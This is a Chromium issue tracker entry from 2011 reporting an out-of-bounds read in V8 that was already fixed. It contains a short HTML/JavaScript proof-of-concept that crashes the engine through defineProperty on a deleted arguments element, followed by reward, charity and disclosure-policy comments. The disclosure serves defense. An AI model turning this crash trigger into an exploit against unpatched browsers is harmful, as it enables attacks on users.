# Security: out-of-bounds read in v8 with defineProperty and arguments

| Field | Value |
|-------|-------|
| **Issue ID** | [40092369](https://issues.chromium.org/issues/40092369) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | sc...@gmail.com |
| **Assignee** | km...@chromium.org |
| **Created** | 2011-06-30 |
| **Bounty** | $1,000.00 |

## Description

Already fixed as of http://code.google.com/p/v8/issues/detail?id=1513 and http://code.google.com/p/v8/source/detail?r=8481

Seems nasty enough:

=> 0x00007ffff5948ce1 <_ZN2v88internal16NumberDictionary3SetEjPNS0_6ObjectENS0_15PropertyDetailsE+113>:	mov    0xf(%rbx,%rdx,1),%rdx

Where %rdx == 0x6ff58


<html>
<head></head>
<body>
<script>

function testcase() {
       return (function (a, b, c) {
           delete arguments[0];
           Object.defineProperty(arguments, "0", {
               value: 10,
               writable: false,
               enumerable: false,
               configurable: false
           });
       }(0, 1, 2));
   }
try{
testcase();
}
catch(e){
       alert(e.message);
}
alert('ok')
</script>
</body>
</html>

Credit: MSVR; exact credit pending

## Timeline

### sc...@gmail.com (2011-06-30)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-07-20)

Certainly a good quality report on an interesting regression, hence worthy of a $1000 Chromium Security Reward!
Thanks for helping catch this such that it never reached a stable build.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-07-20)

Going to charity...

### sc...@gmail.com (2011-08-26)

Charity'ed to American Red Cross. Thanks MS / MSVR! As usual, we increase rewards to a minimum of $1337 when going to charity.

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/88093?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092369)*
